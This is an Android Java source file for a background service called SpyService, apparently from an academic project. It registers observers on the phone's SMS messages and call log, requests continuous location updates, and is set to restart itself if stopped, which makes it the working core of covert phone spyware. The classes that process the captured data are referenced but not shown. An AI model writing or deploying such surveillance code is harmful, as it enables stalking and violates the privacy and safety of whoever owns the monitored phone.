package edu.uj.jkordas.spy;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import edu.uj.jkordas.spy.developer.Logger;
import edu.uj.jkordas.spy.receiver.CallObserver;
import edu.uj.jkordas.spy.receiver.SmsObserver;
import edu.uj.jkordas.spy.receiver.SpyLocationListener;

public class SpyService extends Service {
    private SmsObserver sentSmsObserver = null;
    private CallObserver callObserver;
    private LocationListener locationListener;
    private LocationManager locationManager;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        registerSmsObserver();
        registerCallObserver();
        loadLocationManager();
    }

    private void loadLocationManager() {
        locationListener = new SpyLocationListener(getApplicationContext());
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        String provider = LocationManager.NETWORK_PROVIDER;
        Location location = locationManager.getLastKnownLocation(provider);

        // Initialize the location fields
        if (location != null) {
            Log.d(this.getClass().getName(), "Provider " + provider + " has been selected.");
            locationListener.onLocationChanged(location);
        } else {
            Logger.log(getApplicationContext(), "Location not available");
        }

        locationManager.requestLocationUpdates(provider, 1, 1000, locationListener);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterSmsObserver();
        unregisterCallObserver();
        locationManager.removeUpdates(locationListener);
    }

    private void unregisterSmsObserver() {
        if (sentSmsObserver != null) {
            SpyService.this.getContentResolver().unregisterContentObserver(sentSmsObserver);
            sentSmsObserver = null;
        }
    }

    private void registerSmsObserver() {
        if (sentSmsObserver == null) {
            final Uri SMS_STATUS_URI = Uri.parse("content://sms");
            sentSmsObserver = new SmsObserver(new Handler(), getApplicationContext());
            SpyService.this.getContentResolver().registerContentObserver(SMS_STATUS_URI, true,
                    sentSmsObserver);
        }
    }

    private void unregisterCallObserver() {
        if (callObserver != null) {
            SpyService.this.getContentResolver().unregisterContentObserver(callObserver);
            callObserver = null;
        }
    }

    private void registerCallObserver() {
        if (callObserver == null) {
            final Uri CALL_URI = android.provider.CallLog.Calls.CONTENT_URI;
            callObserver = new CallObserver(new Handler(), getApplicationContext());
            SpyService.this.getContentResolver().registerContentObserver(CALL_URI, true,
                    callObserver);
        }
    }


}
